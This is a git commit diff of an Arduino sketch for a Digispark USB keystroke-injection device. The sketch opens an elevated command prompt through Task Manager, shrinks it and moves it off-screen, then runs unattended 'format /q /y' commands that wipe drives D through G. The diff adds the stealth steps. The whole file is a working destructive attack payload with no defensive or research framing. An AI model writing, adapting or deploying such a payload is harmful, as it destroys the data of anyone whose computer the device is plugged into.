bd0b4b15060e0f23c5f2df06bc27c2c0aa83b55b
Choudhary Abdullah <magnetonx@gmail.com>
2020-01-31 21:16:20 +0530

    Add files via upload

--- Format.ino
+++ Format.ino
@@ -1,9 +1,11 @@
 #include "DigiKeyboard.h"
 #define KEY_TAB 0x2b
+#define KEY_DOWN 0x51 // Keyboard Down Arrow
+#define KEY_ENTER 0x28 //Return/Enter Key
 void setup() { pinMode(1, OUTPUT); }
 void loop() {
   DigiKeyboard.sendKeyStroke(0);
-  DigiKeyboard.delay(500);
+  DigiKeyboard.delay(2000);
   DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
   DigiKeyboard.delay(500);
   DigiKeyboard.println("taskmgr");
@@ -12,11 +14,20 @@ void loop() {
   DigiKeyboard.sendKeyStroke(KEY_N);
   DigiKeyboard.delay(500);
   DigiKeyboard.print("cmd /k mode con: cols=15 lines=1");
+  DigiKeyboard.delay(500);
   DigiKeyboard.sendKeyStroke(KEY_TAB); 
   DigiKeyboard.sendKeyStroke(KEY_SPACE);
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
   DigiKeyboard.delay(200);
   DigiKeyboard.println("taskkill /IM \"taskmgr.exe\" /F ");
+  DigiKeyboard.delay(500);
+  DigiKeyboard.sendKeyStroke(KEY_SPACE, MOD_ALT_LEFT); //Menu  
+  DigiKeyboard.sendKeyStroke(KEY_M); //goto Move
+  for(int i =0; i < 100; i++)
+    {
+      DigiKeyboard.sendKeyStroke(KEY_DOWN);
+    }
+  DigiKeyboard.sendKeyStroke(KEY_ENTER); //Detach from scrolling
   DigiKeyboard.delay(500);
   DigiKeyboard.println("format D:/q /y && format E:/q /y && format F:/q /y && format G:/q /y && exit");
   digitalWrite(1, HIGH);
